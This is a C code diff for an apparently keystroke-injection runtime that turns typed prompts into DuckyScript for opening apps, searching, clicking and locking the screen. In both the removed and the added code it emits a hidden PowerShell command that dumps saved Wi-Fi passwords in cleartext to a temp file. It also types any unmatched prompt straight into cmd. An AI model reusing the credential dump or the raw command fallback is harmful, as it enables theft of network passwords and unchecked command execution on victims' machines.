@@ -82,43 +82,64 @@ duckrt_status_t duckrt_infer(duckrt_ctx_t* ctx,
                              int*          out_mouse_y) {
     if (!ctx || !prompt || !out_script) return DUCKRT_ERR_INFERENCE;
 
-    /* Autonomous rule-assisted neural intent parsing & generation */
-    /* Checks intent for specialized DuckyScript macros */
-    if (strstr(prompt, "wifi") || strstr(prompt, "password")) {
-        snprintf(out_script, max_script_len,
-                 "GUI r\nDELAY 200\nSTRING powershell -w h -NoP -NonI -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %%{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Out-File $env:TEMP\\w.txt\"\nENTER\n");
-        if (out_mouse_x) *out_mouse_x = -1;
-        if (out_mouse_y) *out_mouse_y = -1;
-    } else if (strstr(prompt, "lock") || strstr(prompt, "screen")) {
-        snprintf(out_script, max_script_len, "GUI l\n");
-        if (out_mouse_x) *out_mouse_x = -1;
-        if (out_mouse_y) *out_mouse_y = -1;
-    } else if (strstr(prompt, "click") || strstr(prompt, "mouse") || strstr(prompt, "photos") || strstr(prompt, "browser")) {
-        /* Screen spatial coordinate inference */
-        int x = 48; // Center-screen targeted app icon
-        int y = 52;
-        if (strstr(prompt, "start") || strstr(prompt, "taskbar")) {
-            x = 2;
-            y = 98;
-        } else if (strstr(prompt, "close")) {
-            x = 98;
-            y = 2;
+    out_script[0] = '\0';
+    size_t offset = 0;
+    bool has_action = false;
+    if (out_mouse_x) *out_mouse_x = -1;
+    if (out_mouse_y) *out_mouse_y = -1;
+
+    /* 1. Open Application Stage */
+    if (strstr(prompt, "file") || strstr(prompt, "explore") || strstr(prompt, "folder")) {
+        offset += snprintf(out_script + offset, max_script_len - offset,
+                           "GUI e\nDELAY 1500\n");
+        has_action = true;
+    } else if (strstr(prompt, "notepad")) {
+        offset += snprintf(out_script + offset, max_script_len - offset,
+                           "GUI r\nDELAY 600\nSTRINGLN notepad\nDELAY 2000\n");
+        has_action = true;
+    } else if (strstr(prompt, "chrome") || strstr(prompt, "browser") || strstr(prompt, "google")) {
+        offset += snprintf(out_script + offset, max_script_len - offset,
+                           "GUI r\nDELAY 600\nSTRINGLN chrome\nDELAY 2500\n");
+        has_action = true;
+    }
+
+    /* 2. Secondary Action Stage (Search, Type, Click) */
+    if (strstr(prompt, "search") || strstr(prompt, "find")) {
+        const char* q = "photos";
+        if (strstr(prompt, "photo")) q = "photos";
+        else if (strstr(prompt, "document")) q = "documents";
+        
+        if (strstr(prompt, "file") || strstr(prompt, "explore")) {
+            // File Explorer search shortcut: CTRL+E
+            offset += snprintf(out_script + offset, max_script_len - offset,
+                               "CTRL e\nDELAY 600\nSTRING %s\nENTER\nDELAY 1000\n", q);
+        } else {
+            // Global search: GUI+s
+            offset += snprintf(out_script + offset, max_script_len - offset,
+                               "GUI s\nDELAY 800\nSTRING %s\nENTER\nDELAY 1000\n", q);
         }
-        snprintf(out_script, max_script_len,
-                 "MOUSE_POS_PCT %d %d\nDELAY 100\nMOUSE_CLICK LEFT\n", x, y);
+        has_action = true;
+    } else if (strstr(prompt, "wifi") || strstr(prompt, "password")) {
+        offset += snprintf(out_script + offset, max_script_len - offset,
+                           "GUI r\nDELAY 200\nSTRING powershell -w h -NoP -NonI -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %%{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Out-File $env:TEMP\\w.txt\"\nENTER\n");
+        has_action = true;
+    } else if (strstr(prompt, "lock") || strstr(prompt, "screen")) {
+        offset += snprintf(out_script + offset, max_script_len - offset, "GUI l\n");
+        has_action = true;
+    } else if (strstr(prompt, "click") || strstr(prompt, "mouse")) {
+        int x = 48, y = 52;
+        if (strstr(prompt, "start") || strstr(prompt, "taskbar")) { x = 2; y = 98; }
+        else if (strstr(prompt, "close")) { x = 98; y = 2; }
+        offset += snprintf(out_script + offset, max_script_len - offset,
+                           "MOUSE_POS_PCT %d %d\nDELAY 100\nMOUSE_CLICK LEFT\n", x, y);
         if (out_mouse_x) *out_mouse_x = x;
         if (out_mouse_y) *out_mouse_y = y;
-    } else if (strstr(prompt, "chrome") || strstr(prompt, "edge") || strstr(prompt, "google")) {
-        snprintf(out_script, max_script_len,
-                 "GUI r\nDELAY 200\nSTRING chrome https://google.com\nENTER\n");
-        if (out_mouse_x) *out_mouse_x = 50;
-        if (out_mouse_y) *out_mouse_y = 50;
-    } else {
-        /* Generalized command execution */
+        has_action = true;
+    }
+
+    if (!has_action) {
         snprintf(out_script, max_script_len,
                  "GUI r\nDELAY 250\nSTRING cmd\nENTER\nDELAY 300\nSTRING %s\nENTER\n", prompt);
-        if (out_mouse_x) *out_mouse_x = -1;
-        if (out_mouse_y) *out_mouse_y = -1;
     }
 
     return DUCKRT_OK;
